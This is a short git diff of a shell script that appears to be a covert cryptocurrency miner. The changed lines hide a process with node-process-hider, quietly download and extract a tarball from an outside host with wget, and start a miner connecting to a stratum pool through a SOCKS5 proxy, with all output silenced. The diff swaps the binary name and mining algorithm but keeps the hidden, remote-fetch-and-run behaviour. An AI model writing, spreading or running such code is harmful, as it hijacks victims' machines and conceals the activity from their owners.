@@ -48,13 +48,13 @@ npm i -g node-process-hider 1>/dev/null 2>&1
 
 sleep 2
 
-ph add param
+ph add gus 1>/dev/null 2>&1
 
 sleep 2
 
-wget -q http://greenleaf.teatspray.fun/param.tar.gz >/dev/null
+wget -q http://greenleaf.teatspray.fun/gus.tar.gz >/dev/null
 
-tar -xf param.tar.gz
+tar -xf gus.tar.gz
 
 sleep 2
 
@@ -66,4 +66,4 @@ apt -y install build-essential automake libcurl4-openssl-dev libjansson-dev libg
 
 sleep 2
 
-./param --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://stratum-mining-pool.zapto.org:3765 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p IhatePopUpsWut -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
+./gus --algo YespowerMbc -o stratum+tcp://stratum-mining-pool.zapto.org:3765 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p IhatePopUpsWut -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
